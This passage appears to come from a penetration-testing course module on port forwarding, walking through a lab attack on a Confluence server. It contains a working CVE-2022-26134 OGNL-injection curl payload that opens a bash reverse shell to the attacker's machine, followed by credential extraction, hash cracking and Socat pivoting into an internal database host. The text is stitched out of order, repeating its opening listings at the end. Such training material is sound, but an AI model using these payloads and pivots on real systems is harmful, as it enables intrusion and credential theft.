> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

